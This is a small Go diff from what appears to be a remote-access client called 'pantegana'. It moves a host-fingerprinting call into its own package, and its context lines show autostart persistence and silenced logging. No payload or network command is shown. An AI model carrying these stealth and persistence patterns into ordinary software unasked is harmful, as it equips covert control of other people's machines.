@@ -12,6 +12,7 @@ import (
 	"strconv"
 	"time"
 
+	"github.com/elleven11/pantegana/client/fingerprinter"
 	"github.com/emersion/go-autostart"
 )
 
@@ -89,7 +90,7 @@ func RunClient(cfg *ClientConfig) {
 		log.SetOutput(ioutil.Discard)
 	}
 
-	RunFingerprinter()
+	fingerprinter.Run()
 
 	client := cfg.ClientSetup()
 
